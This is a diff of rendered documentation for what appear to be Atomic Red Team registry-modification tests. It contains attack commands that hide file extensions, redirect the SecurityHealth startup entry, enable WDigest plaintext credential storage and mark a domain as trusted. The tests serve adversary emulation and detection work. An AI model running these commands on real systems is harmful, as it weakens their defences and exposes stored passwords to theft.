@@ -1030,7 +1030,8 @@
 <h3>Atomic Test #1 - Modify Registry of Current User Profile - cmd<a class="headerlink" href="#atomic-test-1-modify-registry-of-current-user-profile-cmd" title="Permalink to this headline">¶</a></h3>
 <p>Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message “The operation completed successfully.”
 will be displayed. Additionally, open Registry Editor to view the new entry in HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f
@@ -1050,10 +1051,11 @@ will be displayed. Additionally, open Registry Editor to view the new entry in H
 <p>Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when
 CMD is ran as Administrative rights. Upon execution, the message “The operation completed successfully.”
 will be displayed. Additionally, open Registry Editor to view the modified entry in HKCU\Software\Microsoft\Windows\CurrentVersion\Run.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="id1">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d #{new_executable} /f
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -1070,7 +1072,8 @@ will be displayed. Additionally, open Registry Editor to view the modified entry
 <p>Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).
 Upon execution, the message “The operation completed successfully.” will be displayed.
 Additionally, open Registry Editor to view the modified entry in HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="id2">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
@@ -1094,7 +1097,7 @@ Additionally, open Registry Editor to view the modified entry in HKCU:\SOFTWARE\
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="attack-commands-run-with-powershell">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$key</span><span class="p">=</span> <span class="s2">&quot;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\#{bad_domain}\&quot;</span>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$key</span><span class="p">=</span> <span class="s2">&quot;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\bad-domain.com\&quot;</span>
 <span class="nv">$name</span> <span class="p">=</span><span class="s2">&quot;bad-subdomain&quot;</span>
 <span class="nb">new-item</span> <span class="nv">$key</span> <span class="n">-Name</span> <span class="nv">$name</span> <span class="n">-Force</span>
 <span class="nb">new-itemproperty</span> <span class="nv">$key$name</span> <span class="n">-Name</span> <span class="n">https</span> <span class="n">-Value</span> <span class="n">2</span> <span class="n">-Type</span> <span class="n">DWORD</span><span class="p">;</span>
